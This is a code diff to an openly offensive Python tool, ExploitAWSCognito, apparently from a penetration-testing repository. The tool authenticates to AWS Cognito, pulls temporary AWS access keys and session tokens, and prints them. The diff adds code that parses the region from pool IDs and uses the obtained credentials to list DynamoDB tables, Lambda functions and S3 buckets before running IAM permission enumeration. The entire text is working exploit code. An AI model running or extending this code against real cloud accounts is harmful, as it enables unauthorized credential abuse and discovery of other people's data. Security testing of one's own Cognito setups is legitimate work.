@@ -7,13 +7,14 @@ from enumerate_iam.main import enumerate_iam
 import hashlib
 import hmac
 import base64
+import boto3
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class ExploitAWSCognito:
-	def __init__(self, region, username, password, enumiam):
-		self.region = region
+	def __init__(self, username, password, enumiam):
+		self.region = None
 		self.username = username
 		self.password = password
 		self.clientId = None
@@ -24,9 +25,11 @@ class ExploitAWSCognito:
 
 	def update(self, clientId=None, identityPoolId=None, userPoolId=None, cognitoSecret=None, enumiam=None):
 		if clientId:
-			self.clientId = clientId
+			self.region = clientId.split(":")[0]
+			self.clientId = clientId.split(":")[1]
 		if identityPoolId:
-			self.identityPoolId = identityPoolId
+			self.region = identityPoolId.split(":")[0]
+			self.identityPoolId = identityPoolId.split(":")[1]
 		if userPoolId:
 			self.userPoolId = userPoolId
 		if cognitoSecret:
@@ -88,6 +91,28 @@ class ExploitAWSCognito:
 					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - SessionToken: {SessionToken}")
 					self.logProc(f"\t[!] {self.region}:{self.identityPoolId} - Expiration: {Expiration}")
 
+					self.logProc(f"[+] {self.region}:{self.identityPoolId} - Enumerate AWS services permissions !!!")
+					try:
+						dynamodb = boto3.client("dynamodb", aws_access_key_id=AccessKeyId, aws_secret_access_key=SecretKey, aws_session_token=SessionToken)
+						r = dynamodb.list_tables()
+						self.logProc(f"\t[!] dynamodb.list_tables: {r}")
+					except:
+						self.logError(f"\t[-] dynamodb.list_tables: failed")
+
+					try:
+						lambdaclient = boto3.client("lambda", aws_access_key_id=AccessKeyId, aws_secret_access_key=SecretKey, aws_session_token=SessionToken)
+						r = lambdaclient.list_functions()
+						self.logProc(f"\t[!] lambdaclient.list_functions: {r}")
+					except:
+						self.logError(f"\t[-] lambdaclient.list_functions: failed")
+
+					try:
+						s3client = boto3.client("s3", aws_access_key_id=AccessKeyId, aws_secret_access_key=SecretKey, aws_session_token=SessionToken)
+						r = s3client.list_buckets()
+						self.logProc(f"\t[!] s3client.list_buckets: {r}")
+					except:
+						self.logError(f"\t[-] s3client.list_buckets: failed")
+
 					if self.enumiam:
 						enumerate_iam(AccessKeyId, SecretKey, SessionToken, self.region)
 
@@ -113,11 +138,11 @@ if __name__ == "__main__":
 	parser.add_argument("-cognitosecret", "--cognito-secret", help = "Cognito Secret")
 
 	args = parser.parse_args()
-	if args.region == None or args.username == None or args.password == None:
+	if args.username == None or args.password == None:
 		print(msg)
 		exit()
 
-	exploit_instance = ExploitAWSCognito(args.region.strip(), args.username.strip(), args.password.strip(), "enum_iam" in args)
+	exploit_instance = ExploitAWSCognito(args.username.strip(), args.password.strip(), "enum_iam" in args)
 
 	if args.client_id:
 		exploit_instance.update(clientId=args.client_id.strip())
